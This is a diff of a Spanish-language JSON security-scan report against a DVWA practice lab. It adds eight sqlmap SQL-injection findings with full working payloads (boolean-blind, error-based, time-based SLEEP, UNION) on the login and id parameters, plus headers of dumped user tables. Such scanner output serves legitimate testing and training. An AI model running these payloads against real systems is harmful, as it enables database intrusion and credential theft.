@@ -1,10 +1,10 @@
 {
     "resumen": {
-        "total_urls_unicas": 33,
+        "total_urls_unicas": 35,
         "urls_spider": 24,
         "alertas_zap": 37,
         "rutas_ffuf": 8,
-        "vulnerabilidades_sqlmap": 0
+        "vulnerabilidades_sqlmap": 8
     },
     "spider": {
         "herramienta": "ZAP Spider",
@@ -464,6 +464,79 @@
     },
     "sqlmap": {
         "herramienta": "SQLMAP",
-        "vulnerabilidades": []
+        "vulnerabilidades": [
+            {
+                "url": "http://dvwa/vulnerabilities/brute/?Login=Login&password=ZAP&username=ZAP",
+                "parametro": "username",
+                "tipo": "boolean-based blind",
+                "titulo": "MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause",
+                "payload": "username=OGvY' RLIKE (SELECT (CASE WHEN (6678=6678) THEN 0x4f477659 ELSE 0x28 END))-- gGwh&password=sdeo&Login=Login",
+                "metodo": "GET",
+                "extra_info": "Volcado de Tabla: dvwa.users (5 registros)\n\n+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+\n| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |\n+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+\n\n+------------+--------+-------------------------+\n| comment_id | name   | comment                 |\n+------------+--------+-------------------------+"
+            },
+            {
+                "url": "http://dvwa/vulnerabilities/brute/?Login=Login&password=ZAP&username=ZAP",
+                "parametro": "username",
+                "tipo": "error-based",
+                "titulo": "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)",
+                "payload": "username=OGvY' AND EXTRACTVALUE(2382,CONCAT(0x5c,0x71766b6a71,(SELECT (ELT(2382=2382,1))),0x71706b7a71))-- WJum&password=sdeo&Login=Login",
+                "metodo": "GET",
+                "extra_info": "Volcado de Tabla: dvwa.users (5 registros)\n\n+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+\n| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |\n+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+\n\n+------------+--------+-------------------------+\n| comment_id | name   | comment                 |\n+------------+--------+-------------------------+"
+            },
+            {
+                "url": "http://dvwa/vulnerabilities/brute/?Login=Login&password=ZAP&username=ZAP",
+                "parametro": "username",
+                "tipo": "time-based blind",
+                "titulo": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
+                "payload": "username=OGvY' AND (SELECT 8355 FROM (SELECT(SLEEP(5)))polt)-- BvZr&password=sdeo&Login=Login",
+                "metodo": "GET",
+                "extra_info": "Volcado de Tabla: dvwa.users (5 registros)\n\n+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+\n| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |\n+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+\n\n+------------+--------+-------------------------+\n| comment_id | name   | comment                 |\n+------------+--------+-------------------------+"
+            },
+            {
+                "url": "http://dvwa/vulnerabilities/brute/?Login=Login&password=ZAP&username=ZAP",
+                "parametro": "username",
+                "tipo": "UNION query",
+                "titulo": "MySQL UNION query (NULL) - 8 columns",
+                "payload": "username=OGvY' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71766b6a71,0x666b656642434d4d437743754d5767787449636d49615054646c5650584b50586f646c5979544753,0x71706b7a71),NULL,NULL#&password=sdeo&Login=Login",
+                "metodo": "GET",
+                "extra_info": "Volcado de Tabla: dvwa.users (5 registros)\n\n+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+\n| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |\n+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+\n\n+------------+--------+-------------------------+\n| comment_id | name   | comment                 |\n+------------+--------+-------------------------+"
+            },
+            {
+                "url": "http://dvwa/vulnerabilities/sqli/?Submit=Submit&id=ZAP",
+                "parametro": "id",
+                "tipo": "boolean-based blind",
+                "titulo": "OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)",
+                "payload": "id=9749' OR NOT 6958=6958#&Submit=Submit",
+                "metodo": "GET",
+                "extra_info": "Volcado de Tabla: dvwa.users (5 registros)\n\n+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+\n| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |\n+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+\n\n+------------+--------+-------------------------+\n| comment_id | name   | comment                 |\n+------------+--------+-------------------------+"
+            },
+            {
+                "url": "http://dvwa/vulnerabilities/sqli/?Submit=Submit&id=ZAP",
+                "parametro": "id",
+                "tipo": "error-based",
+                "titulo": "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)",
+                "payload": "id=9749' AND EXTRACTVALUE(9177,CONCAT(0x5c,0x7176626271,(SELECT (ELT(9177=9177,1))),0x71767a6a71))-- cySU&Submit=Submit",
+                "metodo": "GET",
+                "extra_info": "Volcado de Tabla: dvwa.users (5 registros)\n\n+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+\n| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |\n+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+\n\n+------------+--------+-------------------------+\n| comment_id | name   | comment                 |\n+------------+--------+-------------------------+"
+            },
+            {
+                "url": "http://dvwa/vulnerabilities/sqli/?Submit=Submit&id=ZAP",
+                "parametro": "id",
+                "tipo": "time-based blind",
+                "titulo": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
+                "payload": "id=9749' AND (SELECT 1994 FROM (SELECT(SLEEP(5)))XmoK)-- hdrj&Submit=Submit",
+                "metodo": "GET",
+                "extra_info": "Volcado de Tabla: dvwa.users (5 registros)\n\n+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+\n| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |\n+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+\n\n+------------+--------+-------------------------+\n| comment_id | name   | comment                 |\n+------------+--------+-------------------------+"
+            },
+            {
+                "url": "http://dvwa/vulnerabilities/sqli/?Submit=Submit&id=ZAP",
+                "parametro": "id",
+                "tipo": "UNION query",
+                "titulo": "MySQL UNION query (NULL) - 2 columns",
+                "payload": "id=9749' UNION ALL SELECT CONCAT(0x7176626271,0x7079574a514345724e706463796944457170797a5057466868546f547676774e655a4b6e6d66716d,0x71767a6a71),NULL#&Submit=Submit",
+                "metodo": "GET",
+                "extra_info": "Volcado de Tabla: dvwa.users (5 registros)\n\n+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+\n| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |\n+---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+\n\n+------------+--------+-------------------------+\n| comment_id | name   | comment                 |\n+------------+--------+-------------------------+"
+            }
+        ]
     }
 }
